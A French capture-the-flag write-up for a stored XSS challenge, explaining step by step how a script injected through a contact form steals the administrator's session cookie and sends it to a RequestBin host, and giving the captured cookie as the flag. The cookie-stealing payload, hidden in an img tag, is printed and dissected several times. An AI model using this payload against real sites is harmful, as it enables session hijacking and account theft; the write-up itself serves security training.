## Challenges

### Web Client

### Challenge: XSS - Stockée 1

#### Problème

Ce défi consiste à trouver le flag.

#### Première étape :

La première étape était d'identifier la vulnérabilité, qui était une XSS (cross-site scripting). Pour tester cette faille, nous avons injecté un code javascript de base dans le formulaire de contact et observé l'apparition d'une pop-up, confirmant la présence de la vulnérabilité.

#### Deuxième étape :

Dans cette étape, notre objectif était de récupérer le Cookie de l’administrateur du site. Pour cela, nous avons construit une XSS avec un payload de Cookie.

**XSS avec un payload de Cookie:**

Le script Javascript utilisé était conçu pour être envoyé via un formulaire de contact. Lorsque l'administrateur du site consulte ce formulaire, le script envoie son cookie à un serveur externe.

Nous avons choisi d'insérer ce script dans une balise image `<img>` pour dissimuler le payload. Cette balise est particulièrement adaptée car elle est souvent utilisée pour charger des ressources externes sans susciter de suspicion. Ainsi, l'administrateur ne remarquerait pas la présence de code malveillant.

```javascript 
<script>document.write('<img src=\'https://requestb.in/xxxxx?cookie='+document.cookie+'\>admin</img>');</script>
```
une XSS peut se faire à partir d’un code Javascript mais pas uniquement.
```javascript 
<script></script>
```
Création du script où mon code sera interprété.

```javascript 
document.write
```
Le document.write sert à écrire du texte dans un document HTML. Il prend en paramètre ce qui se trouve entre les parenthèses.

```javascript 
document.write('<img src=\'https://requestb.in/xxxxx?cookie='+document.cookie+'\>admin</img>');
```

**Explication:**

L'utilisation de la balise image `<img>` permet de masquer le script, car elle est perçue comme un chargement d'image normal par l'administrateur.

Nous avons choisi d'utiliser un lien RequestBin : https://requestb.in/xxxxxxxxxxx. Le script inséré dans la balise image contenait une source pointant vers ce serveur, où nous avons ajouté le paramètre "cookie=" suivi de "document.cookie" pour capturer le cookie de session de l'administrateur.

Le cookie récupéré était : 
`cookie: ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6>admin</img></span><br/><hr/><span><b>admin</b></span><br/><span><script>document.write(`

#### Solution
Le cookie pour validation est donc : `NkI9qe4cdLIO2P7MIsWS8ofD6`
